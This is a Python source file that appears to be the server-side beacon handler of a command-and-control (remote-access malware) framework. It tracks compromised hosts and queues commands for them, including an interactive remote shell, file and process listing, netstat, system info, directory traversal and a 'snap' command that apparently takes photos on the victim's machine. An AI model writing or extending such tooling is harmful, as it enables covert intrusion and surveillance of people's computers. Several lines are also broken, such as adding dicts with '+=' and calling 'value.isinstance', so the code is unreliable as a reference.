from ServerDatabase.database import DatabaseClass
from .file_manager import FileManagerClass
from .global_objects import (
    command_list,
    beacon_list,
)

import uuid
import colorama
import json
import traceback


class beacon_command:
    def __init__(self, command_uuid, beacon_uuid, command, command_output,
                 executed, command_data):
        self.command_uuid = command_uuid
        self.beacon_uuid = beacon_uuid
        self.command = command
        self.command_output = command_output
        self.executed = executed
        self.command_data = command_data


class Beacon:
    """Handles commands within a session"""

    def __init__(self, uuid, address, hostname, operating_system,
                 last_beacon, timer, jitter, config):       
        self.uuid = uuid
        self.database = DatabaseClass(config)  
        self.file_manager = FileManagerClass()
        self.uuid = uuid
        self.address = address
        self.hostname = hostname
        self.operating_system = operating_system
        self.last_beacon = last_beacon
        self.next_beacon = str(last_beacon) + str(timer)
        self.timer = timer
        self.jitter = jitter
        self.config = config
        colorama.init(autoreset=True) 

    def close_connection(self, userID) -> None:
        """
        closes connection from the current session within the session commands
        """
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: Y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " + userID)

            try:
                add_beacon_command_list(userID, None, "shutdown")

            except BaseException:  # handles ssl.SSLEOFError
                if not self.config['server']['quiet_mode']:
                    print(colorama.Fore.RED + "Traceback:")
                    traceback.print_exc()
                pass
                    
            remove_beacon_list(userID)

            print(colorama.Back.GREEN + "Closed")
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed")
        return

    def shell(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        print(
            f"Shell {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Command: ")
        add_beacon_command_list(userID, None, "shell", command)

    def list_dir(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        print(
            f"ListDir {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Directory: ")
        add_beacon_command_list(userID, None, "list_dir", command)

    def list_processes(self, userID) -> None:
        add_beacon_command_list(userID, None, "list_processes", "")
        return

    def systeminfo(self, userID) -> None:
        """gets the systeminfo of the client"""
        add_beacon_command_list(userID, None, "systeminfo", "")
        return

    def disk_usage(self, userID) -> None:
        add_beacon_command_list(userID, None, "disk_usage", "")
        return

    def dir_traversal(self, userID) -> None:
        add_beacon_command_list(userID, None, "directory_traversal", "")
        return

    def netstat(self, userID) -> None:
        add_beacon_command_list(userID, None, "netstat", "")
        return

    def takePhoto(self, userID) -> None:
        add_beacon_command_list(userID, None, "snap", "")
        return
    
    def list_files(self, userID) -> None:
        self.file_manager.list_files(userID)

    def list_db_commands(self, userID) -> None:
        for _, beacon_commands in command_list.items():
            if beacon_commands.beacon_uuid == userID:
                print(f"""Command ID: {beacon_commands.command_uuid}
                    Command: {beacon_commands.command}
                    Response: {beacon_commands.command_output if beacon_commands.command_output else "Awaiting Response"}""") # noqa
        return

    def beacon_configueration(self, userID) -> None:
        data = {}
        additional_data = "y"
        while additional_data != "n":
            command = input("Enter Configuration command: ")
            value = input("Enter configuration value: ")
            if value.isinstance(int):
                value = int(value)
            else:
                print("Value must be an integer")
            data += {command: value}
            if (input("Add another confiugration option? (y/N)"
                      ).lower() == "y"):
                continue
            else:
                break
        add_beacon_command_list(userID, None, "beacon_configuration", data)
        return


def add_beacon_list(uuid: str, r_address: str, hostname: str,
                    operating_system: str, last_beacon, timer,
                    jitter, config) -> None:
    new_beacon = Beacon(
        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, config
    )
    beacon_list[uuid] = new_beacon


def add_beacon_command_list(beacon_uuid: str, command_uuid: str,
                            command: str, command_data: json = {}) -> None:
    if not command_uuid or command_uuid == "":
        command_uuid = str(uuid.uuid4())
    new_command = beacon_command(command_uuid, beacon_uuid,
                                 command, "", False, command_data)
    command_list[command_uuid] = new_command


def remove_beacon_list(uuid: str) -> None:
    """
    Removes beacon from the global beacon dictionary.
    """
    if uuid in beacon_list:
        beacon_list.pop(uuid)
    else:
        print(f"Beacon {uuid} not found in beacon list")
